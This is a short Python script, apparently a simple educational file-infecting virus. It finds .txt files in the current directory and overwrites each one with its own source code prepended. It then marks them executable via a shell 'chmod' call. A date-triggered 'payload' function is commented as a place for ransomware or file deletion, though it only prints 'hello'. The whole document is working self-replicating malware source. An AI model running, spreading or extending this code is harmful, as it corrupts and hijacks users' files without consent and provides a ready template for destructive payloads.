
import os
import datetime

################################################
def search(path):
    files_to_infect = []
    files_list = os.listdir(path)
    ## print(files_list)
    for file in files_list:
        temp = file.split(".")
        ##print( temp[1] )
        if temp[1] == "txt":
            files_to_infect.append(file)
    return files_to_infect

#################################################
def infect(files_to_infect):
    print("files received to infect")
    ## print(files_to_infect)
    virus_string = ""
    virus = open(  os.path.abspath(__file__)   )
    for i, line in enumerate(virus):
        ##print(line)
        virus_string = virus_string + line
    virus.close()
    ## print( virus_string  )
    for fname in files_to_infect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname, "w")
        f.write( virus_string + "##" + temp  )
        f.close()
        ## os.chmod(fname, 777)
        os.system("chmod u+x " + fname )
    return

################################################
def payload():
    ## ransomware or deleting files
    if datetime.datetime.now().day == 28:
        print("hello")


path = "."
files_to_infect = search(path)
infect(files_to_infect)
payload()
